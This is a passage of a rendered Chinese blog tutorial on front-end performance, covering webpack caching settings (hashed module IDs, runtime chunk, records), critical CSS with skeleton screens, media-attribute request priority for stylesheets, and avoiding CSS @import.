的入口文件除了包含它的 runtime、业务模块代码，同时还有一个用于异步加载的小型 manifest，任何一个模块的变化，最后必然会传导到入口文件。这些都会使得网站发布后，没有改动源码的资源也会缓存失效。</p>\n<p>规避这些问题有一些常用的方式。</p>\n<h5 id="使用-hash-来替代自增-id"><a href="#%E4%BD%BF%E7%94%A8-hash-%E6%9D%A5%E6%9B%BF%E4%BB%A3%E8%87%AA%E5%A2%9E-id" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 Hash 来替代自增 ID</h5>\n<p>你可以使用 HashedModuleIdsPlugin 插件，它会根据模块的相对路径来计算 Hash 值。当然，你也可以使用 webpack 提供的 optimization.moduleIds，将其设置为 hash，或者选择其他合适的方式。</p>\n<h5 id="将-runtime-chunk-单独拆分出来"><a href="#%E5%B0%86-runtime-chunk-%E5%8D%95%E7%8B%AC%E6%8B%86%E5%88%86%E5%87%BA%E6%9D%A5" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>将 runtime chunk 单独拆分出来</h5>\n<p>通过 <code class="language-text">optimization.runtimeChunk</code> 配置可以让 webpack 把包含 manifest 的 runtime 部分单独分离出来，这样就可以尽可能限制变动影响的文件范围。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="81420466070263450000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// webpack.config.js\nmodule.exports = {\n  //...\n  optimization: {\n    runtimeChunk: {\n      name: \'runtime\'\n    }\n  }\n};`, `81420466070263450000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// webpack.config.js</span>\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>\n  <span class="token comment">//...</span>\n  optimization<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n    runtimeChunk<span class="token punctuation">:</span> <span class="token punctuation">{</span>\n      name<span class="token punctuation">:</span> <span class="token string">\'runtime\'</span>\n    <span class="token punctuation">}</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h5 id="使用-records"><a href="#%E4%BD%BF%E7%94%A8-records" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用 records</h5>\n<p>你可以通过 recordsPath 配置来让 webpack 产出一个包含模块信息记录的 JSON 文件，其中包含了一些模块标识的信息，可以用于之后的编译。这样在后续的打包编译时，对于被拆分出来的 Bundle，webpack 就可以根据 records 中的信息来尽量避免破坏缓存。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="46264083879984020000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`// webpack.config.js\nmodule.exports = {\n  //...\n  recordsPath: path.join(__dirname, \'records.json\')\n};`, `46264083879984020000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token comment">// webpack.config.js</span>\nmodule<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>\n  <span class="token comment">//...</span>\n  recordsPath<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">\'records.json\'</span><span class="token punctuation">)</span>\n<span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id="css"><a href="#css" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>CSS</h2>\n<h3 id="关键-css"><a href="#%E5%85%B3%E9%94%AE-css" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>关键 CSS</h3>\n<p>在性能优化上，其实我们会更关注关键渲染路径（Critical Rendering Path，即 CRP），而不一定是最快加载完整个页面。</p>\n<p>CRP 是指优先显示与当前用户操作有关的内容。由于 CSS 会“间接”阻塞页面的解析，所以在这个过程中的 CSS 也被称为关键 CSS。识别出当前业务中的关键 CSS，优先下载与解析它，将会帮助我们更好降低延迟。</p>\n<p>所以我们首先还是需要先建立好概念：很多时候，我们并不是在追求整体页面的最快加载，而是最核心最关键的那部分。例如在视频网站上可能是播放器，在文档站点可能是阅读器。</p>\n<p>由于很多时候，关键 CSS 不会太大，因此有一种常见的优化措施是，将关键 CSS 的内容通过 <code class="language-text">&lt;style&gt;</code> 标签内联到 <code class="language-text">&lt;head&gt;</code> 中，然后异步加载其他非关键 CSS。这样对于关键路径的渲染可以减少一次 RTT (Round-Trip Time)。用户可以更快看到一些页面初始的渲染结果。</p>\n<p>经典的骨架屏可以算是这种思路的一个延展。我们会生成一个不包含实际功能的静态页面，将必要的脚本、样式、甚至图片（base64）资源都内联到其中，当用户访问时直接先返回该页面，就可以很快让用户看到页面结果，之后在异步渐进加载预渲染，就会让用户感觉“很快”。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-a7cc8.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 49.57142857142858%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsSAAALEgHS3X78AAABFklEQVQoz51R20rDQBDNp4vaJ9E3xUoR0TcR/AFfBG+1Flv0ITbVbugt982tTbKZ3Thxa1BKVTwcZs/CHmbOrLJevz087161BzedYfNpfP88QaLYO+3snLTrZ92to9b28cPG/uXa7sXmwXWt0aw17iSVOApfR6ba1y2XphkTogAQiOIT8WxGKQ1CRBR8h2I79FEdqn3iuDRjDF/z0iuAcyQKj4ZT0zWsil5FxXb9Xo8MyAhFPE9YjoAcoKw52rnnh+gxbW+ZpVnTyItGbDm27PxRATgOQoNouspsOZ4+tt50Y2I4jOXFEtC8srM8ZIZ/miWTNMOQsAAK/kvmr5d5klYerLgwjE/9v3XGr1osTBTlb4H4eWHv7XQnaLHWp1YAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 10 36 46" title="" data-src="/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-fee1c.png" data-srcset="/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-a67b7.png 200w,\n/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-0b187.png 400w,\n/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-fee1c.png 800w,\n/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-b1a91.png 1200w,\n/static/2021-07-22-10-36-46-fdb320838951f8b4d59c077606c6f842-a7cc8.png 1400w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>骨架屏可以手动编写，当然也可以通过编译插件来帮助你自动生成骨架屏</p>\n<h3 id="优化资源请求"><a href="#%E4%BC%98%E5%8C%96%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>优化资源请求</h3>\n<h4 id="按需加载"><a href="#%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>按需加载</h4>\n<p>与 JavaScript 类似，我们的 CSS 也是可以按需加载的。尤其在当下组件化盛行的潮流里，组件的按需加载就可能会包括了 JavaScript 脚本、CSS 样式表、图标图片。在上一部分介绍的 webpack code split 也会包含这一部分。</p>\n<p>除了使用一些构建工具以及对应的插件外，你也可以使用 loadCSS 这样的库来实现 CSS 文件的按需异步加载。</p>\n<h4 id="合并文件"><a href="#%E5%90%88%E5%B9%B6%E6%96%87%E4%BB%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>合并文件</h4>\n<p>同样的，参照 JavaScript，我们也可以把一些 CSS 文件进行合并来减少请求数。</p>\n<h4 id="请求的优先级排序"><a href="#%E8%AF%B7%E6%B1%82%E7%9A%84%E4%BC%98%E5%85%88%E7%BA%A7%E6%8E%92%E5%BA%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>请求的优先级排序</h4>\n<p>浏览器中的各类请求是有优先级排序的。低优请求会被排在高优之后再发送。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-93d03.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 24.375000000000004%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAA4klEQVQY00WPyW7FIAxF8/9/175Fm4HMIQECARvCC1RKnW5qHVke7rXkYp2nhS9lzeqmadu2buq2a7u+G6dRKKmNsc79AwQQ7i8K9D7m5GOE8MYzGg/aWY1uh8M9rdeIGh4Mesr7rqVSBgDPs6jYwPp5EfsitIUzxCzUgeHqRk7zeZVSOy72eP1I4/gqOzYocpP0nYuGsa/vEpEOhZxSzskchop+6D8+XyRzDuZlue/bWrtxPo1DDCGckZQF/VdWzbpt5HcAh7VKqcNh0/OK9VobGgopU7qelZRinHBXgBhj/AXJoxUpToitqAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 10 41 37" title="" data-src="/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-fee1c.png" data-srcset="/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-a67b7.png 200w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-0b187.png 400w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-fee1c.png 800w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-b1a91.png 1200w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-95179.png 1600w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-5d5ba.png 2400w,\n/static/2021-07-22-10-41-37-1afe9a14f4eb8051353b1c7635b652d4-93d03.png 2880w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>不过可惜的是，浏览器没有将优先级排序的能力给我们直接开放出来。但在一些场景下，我们可以通过更合理的使用媒体类型和媒体查询来实现资源加载的优先级。下面会介绍一下这种方法。</p>\n<p>一些网站为了达到不同屏幕之间的兼容，可能会使用媒体查询的方式来构建它的样式系统。一般而言，我们都会把样式代码写在一起，例如导航的在各类屏幕下的样式都会放在 navigator.css 下，列表都会放在 list.css 下。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="52586687840881360000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;stylesheet&quot; href=&quot;navigator.css&quot; /> <link rel=&quot;stylesheet&quot; href=&quot;list.css&quot; />`, `52586687840881360000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigator.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>这里带来的一个问题就是，在宽度小于 400px 的场景下，其实并不需要应用宽度 400px 以上的 CSS 样式。针对这个问题，link 标签上其实有一个 media 属性来处理媒体查询下的加载优先级。浏览器会优先下载匹配当前环境的样式资源，相对的，其他非匹配的优先级会下降。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="42171921679594600000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;stylesheet&quot; href=&quot;navigator.css&quot; media=&quot;all&quot; />\n<link rel=&quot;stylesheet&quot; href=&quot;list.css&quot; media=&quot;all&quot; />\n<link rel=&quot;stylesheet&quot; href=&quot;navigator.small.css&quot; media=&quot;(max-width: 500px)&quot; />\n<link rel=&quot;stylesheet&quot; href=&quot;list.small.css&quot; media=&quot;(max-width: 500px)&quot; />`, `42171921679594600000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigator.css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list.css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>all<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>navigator.small.css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>(max-width: 500px)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>list.small.css<span class="token punctuation">"</span></span> <span class="token attr-name">media</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>(max-width: 500px)<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>这样拆分后，当页面大于 500 px 时，navigator.small.css 和 list.small.css 的优先级会降低，同时，它们也不再会阻塞页面的渲染。需要注意的是，优先级降低代表可能会后加载，并非不加载。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-32244.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 26.486988847583643%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsSAAALEgHS3X78AAAA4ElEQVQY0yVPa2+EMAzj//+1SdM+nnYr5XFHaQtNH2lKuRMsbJYV2VYUOc00jrNSrRy+RSeEkH8QbStlx4PZdZ1SSmvtABy4fwBcqqGMtW5EmY2xxnnw3lu76NUsbuUwYSpE28Y7VKhkBmbKOaXU6BUilgViwGJcgJiZl81byCWXHQJGqnr1HosGxyGWmre91Hdzu4v+OU/z4gK2/fOhzO0uf+Sw+kT1xVfGSQekr49P1Y9AyHryCyDNwTfWWn6Au9Raua0PARG1Mdz+PA9+J8b42nfdDwTuPI73BQ52oPAL3e0XCBL35sEAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 22 10 45 09" title="" data-src="/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-fee1c.png" data-srcset="/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-a67b7.png 200w,\n/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-0b187.png 400w,\n/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-fee1c.png 800w,\n/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-b1a91.png 1200w,\n/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-95179.png 1600w,\n/static/2021-07-22-10-45-09-bb988db63024281f2dfa30e9ff046633-32244.png 2152w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h4 id="慎用-import"><a href="#%E6%85%8E%E7%94%A8-import" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>慎用 @import</h4>\n<p>CSS 提供了一个 @import 语法来加载外部的样式文件。然而，这会把你的请求变得串行化。</p>\n<p>考虑 index.css 这个资源，页面上是这么引用的：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="95006552847697230000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;stylesheet&quot; href=&quot;index.css&quot; />`, `95006552847697230000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>\n<p>而在 index.css 中引用了 other.css</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="21019116002902295000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`/* index.css */\n@import url(other.css);`, `21019116002902295000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token comment">/* index.css */</span>\n<span class="token atrule"><span class="token rule">@import</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>other.css<span class="token punctuation">)</span></span><span class="token punctuation">;</span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span></span></pre></div>\n<p>这样浏览器只有当下载了 index.css 并解析到其中 @import 时，才会再去请求 other.css。这是一个串行过程。</p>\n<p>而如果我们把它改造为</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="26229035989844627000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`<link rel=&quot;stylesheet&quot; href=&quot;index.css&quot; /> <link rel=&quot;stylesheet&quot; href=&quot;other.css&quot; />`, `26229035989844627000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="html"\n              >\n                <span class="gatsby-code-button-language">html</span>\n                <span 